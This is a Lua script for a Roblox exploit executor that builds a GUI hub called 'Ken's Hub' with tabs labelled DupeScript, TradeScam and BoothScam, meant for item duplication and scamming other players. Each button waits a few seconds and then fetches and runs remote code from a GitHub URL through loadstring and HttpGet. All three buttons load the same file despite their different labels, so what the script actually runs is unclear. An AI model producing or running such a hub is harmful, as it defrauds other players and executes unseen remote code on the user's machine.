local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Ken's Hub", HidePremium = false, IntroEnabled = false, SaveConfig = true, ConfigFolder = "Ken's Hub Configs"})

--functions
--Tabs
local DupeScript = Window:MakeTab({
	Name = "DupeScript",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local TradeScam = Window:MakeTab({
	Name = "TradeScam",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local BoothScam = Window:MakeTab({
	Name = "BoothScam",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--Buttons
DupeScript:AddButton({
	Name = "Simply Runs The Dupe Script!",
	Callback = function()
	wait(5)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/stublyjulies/DupeFixed/main/DupeFixed-All-Exploits.lua"))()
  	end
})

TradeScam:AddButton({
	Name = "Runs TradeScam Script",
	Callback = function()
    wait(10)
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/stublyjulies/DupeFixed/main/DupeFixed-All-Exploits.lua"))()
  	end    
})

BoothScam:AddButton({
	Name = "Runs the BoothScam Gui!",
	Callback = function()
	wait(5)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/stublyjulies/DupeFixed/main/DupeFixed-All-Exploits.lua"))()
  	end
})

OrionLib:Init()